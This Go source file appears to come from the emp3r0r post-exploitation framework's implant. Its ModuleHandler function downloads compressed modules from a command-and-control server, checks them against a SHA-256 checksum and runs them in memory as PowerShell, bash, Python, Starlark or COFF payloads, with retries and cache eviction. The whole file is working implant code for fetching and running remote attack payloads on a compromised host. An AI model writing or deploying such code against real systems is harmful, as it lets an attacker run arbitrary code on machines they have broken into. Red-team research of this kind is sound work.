package modules

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/script"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

var fetchFile = c2transport.FetchFile

// ModuleHandler downloads and runs modules from C2 using resolved, typed invocation data
func ModuleHandler(peerIP, file_to_download, payload_type, modName, checksum string, invocation def.ResolvedInvocation) (out string) {
	defer func() {
		if r := recover(); r != nil {
			logging.Errorf("ModuleHandler panic executing %s (%s): %v\n%s", modName, payload_type, r, util.CallStack())
			out = logging.Sprintf("module execution panic: %v", r)
		}
	}()

	var err error

	// download and verify module file
	payload_data_downloaded, downloadErr := downloadAndVerifyModule(file_to_download, checksum, peerIP)
	if downloadErr != nil {
		return downloadErr.Error()
	}
	// in memory execution
	payload_data, err := util.Decompress(payload_data_downloaded)
	if err != nil {
		return logging.Sprintf("decompressing %s: %v", file_to_download, err)
	}

	// switch on payload type, in memory execution
	switch payload_type {
	case "powershell":
		out, err := agentutils.ExecutePowerShell(payload_data, invocation.Argv, nil)
		if err != nil {
			return logging.Sprintf("running powershell script: %s (%v)", out, err)
		}
		return out
	case "bash":
		out, err := agentutils.ExecuteShell(payload_data, invocation.Argv, nil)
		if err != nil {
			return logging.Sprintf("running shell script: %s (%v)", out, err)
		}
		return out
	case "python":
		out, err := agentutils.ExecutePython(payload_data, invocation.Argv, nil)
		if err != nil {
			return logging.Sprintf("running python script: %s (%v)", out, err)
		}
		return out
	case "starlark":
		out, err := script.Run(payload_data, invocation.Argv, nil)
		if err != nil {
			return logging.Sprintf("running starlark module: %v", err)
		}
		return out
	case "coff":
		out, err := runCOFFModule(payload_data, invocation)
		if err != nil {
			return logging.Sprintf("running COFF module: %v", err)
		}
		return out
	default:
		return logging.Sprintf("unknown payload type %s or custom loader not available", payload_type)
	}
}

func downloadAndVerifyModule(file_to_download, checksum, peerIP string) (data []byte, err error) {
	// Modules are cached in memfs under their basename (e.g. mem:///sa_whoami).
	// FetchFile already checks the memfs cache as tier-1, so we just call it.
	// On success, cache is populated automatically for future calls.
	for retry := 0; retry < 3; retry++ {
		data, err = fetchFile(common.RuntimeConfig, peerIP, file_to_download, "", checksum)
		if err != nil {
			logging.Print(fmt.Sprintf("downloadAndVerifyModule attempt %d/3 for %s: %v", retry+1, file_to_download, err))
			util.TakeABlink()
			continue
		}
		if crypto.SHA256SumRaw(data) == checksum {
			return data, nil
		}
		logging.Print(fmt.Sprintf("Checksum failed, restarting... (attempt %d/3)", retry+1))
		util.TakeABlink()
		// Evict bad entry from memfs so next attempt re-fetches
		memKey := c2transport.MemFSKey(file_to_download)
		_ = util.RemoveFileAgent(memKey)
	}

	return nil, fmt.Errorf("downloading %s: checksum verification failed after 3 attempts", file_to_download)
}
